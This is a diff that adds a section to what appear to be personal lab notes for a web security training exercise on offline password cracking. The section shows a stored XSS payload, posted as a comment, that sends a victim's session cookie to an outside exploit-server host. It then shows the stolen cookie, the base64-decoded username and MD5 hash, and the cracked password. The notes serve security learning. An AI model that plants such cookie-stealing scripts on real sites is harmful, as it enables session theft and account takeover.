@@ -78,4 +78,32 @@ Invalid password or password ← لو اليوزر موجود.
 
 
 
+----
+
+### 9 offline password cracking 
+
+- > first login with my username and passowrd ``wiener:peter`` with stay login button 
+  >
+  > found in cookie that is encoded in base64
+  >
+  > ``base64(username:md5(password))``
+  >
+  > now we know that comments is vuln to xss you will steal cookie of ``carlos`` by using xss
+  >
+  > in comment put
+  >
+  > ```
+  > <script>document.location='https://exploit-0a1f000d0421311d80d80c4801090020.exploit-server.net/exploit'+document.cookie</script>
+  > ```
+  >
+  > after that go to exploit server then logs you will find cookies of carlos
+  >
+  > ``Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz``
+  >
+  > ``carlos:26323c16d5f4dabff3bb136f2460a943``
+  >
+  > ``carlos:onceuponatime``
+
+
+
 
